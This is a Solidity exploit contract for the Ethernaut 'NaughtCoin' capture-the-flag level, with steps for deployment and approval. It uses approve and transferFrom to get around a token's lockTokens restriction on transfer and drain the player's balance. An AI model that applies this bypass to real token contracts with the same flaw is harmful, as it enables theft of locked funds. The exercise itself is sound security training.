// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface INaughtCoin {
    function player() external view returns (address);
}

contract HackNaughtCoin {
    /*
        1. Deploy this contract
        2. IERC20.approve(HackNaughtCoin, INITIAL_SUPPLY)
            for checking allowance use - (await contract.allowance(player,"0x1A2a09761CD9c66a0F6F08418482C16c01e40af5")).toString()  
            mean await contract.approve("0x1A2a09761CD9c66a0F6F08418482C16c01e40af5","1000000000000000000000000")
        3. call Hack function
    */

    function Hack(IERC20 _NaughtCoin) external {
        address player = INaughtCoin(address(_NaughtCoin)).player();
        uint256 Amount = _NaughtCoin.balanceOf(player);
        // this transferFrom will directly call the NaughtCoin without calling transfer fn of NaughtCoin contract 
        // so lockTokens modifire will not call
        _NaughtCoin.transferFrom(player, address(this), Amount);
    }
}
